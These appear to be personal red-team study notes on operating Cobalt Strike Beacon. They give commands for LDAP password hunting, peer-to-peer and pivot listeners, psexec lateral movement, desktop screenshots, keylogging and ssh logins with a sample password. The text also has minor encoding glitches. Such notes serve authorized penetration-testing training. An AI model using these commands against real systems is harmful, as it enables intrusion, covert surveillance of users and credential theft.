## Description:  



### Useful BOFs

[Situational Awareness BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)

Can use this to look for passwords in descriptions fields 

`ldapsearch (&(objectClass=User)(objectCategory=Person)) name,samaccountname,description

or find domain admins

`netGroupListMembers "Domain Admins" domainname.local`




### Peer-to-Peer Listeners
Allows one beacon to talk to another beacon without having to directly talk to the team server (like setting up a port bind on target).

Go to Listeners, add, choose payload to be either beacon SMB or beacon TCP.

Generate payload for that listener, execute on second target. 

Use `link` and `connect` commands on first target to connect.

`connect <first_target_ip> 4444`

### Pivot Listeners

^4b657f

^118d4f
This is another type of P2P listener that (currently only) uses TCP, but it works in the opposite direction to the regular TCP listener (like setting up a reverse shell).

When you spawn a Beacon payload that uses the TCP listener, that Beacon acts as a TCP server and waits for an incoming connection from an existing Beacon (TCP client).

In scenarios such as GPO abuse, you don't know when the target will actually execute your payload and therefore when you need issue theÂ `connect`Â command. When a Beacon checks in over a Pivot listener, it will appear in the UI immediately without having to manually connect to it.

To start a Pivot Listener on an existing Beacon, right-click it and selectÂ **Pivoting > Listener**.

Once started, your selected port will be bound on that machine.

```
beacon> run netstat -anp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING
```

You can generate payloads for the pivot listener in exactly the same way as other listeners. When executed on a target, you should see the Beacon appear automatically. 

For example:
Go to Attacks, Packages, Windows Executable (S), choose the listener you just set up. Run payload on target.

You can also use 'psexec64'

```
jump psexec64 srv-1 name-of-pivot-listner
```

### Screenshots

^563c93

Taking screenshots of the userâ€™s desktop can be useful just to see what they are doing. It can show what systems or applications they're using, what shortcuts they have, what documents theyâ€™re working on and so on.

```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop

```


### KeyLogger

^00b23d

A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive data.
`Keylogger`

All keystrokes can be seen atÂ **View > Keystrokes**.


The keylogger runs as a job that can be stopped with theÂ `jobkill`Â command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1

```


### ssh

Beacon also has a built-in ssh client
```
beacon> ssh 10.10.17.12:22 svc_oracle Passw0rd!
[+] established link to child session: 10.10.17.12

```
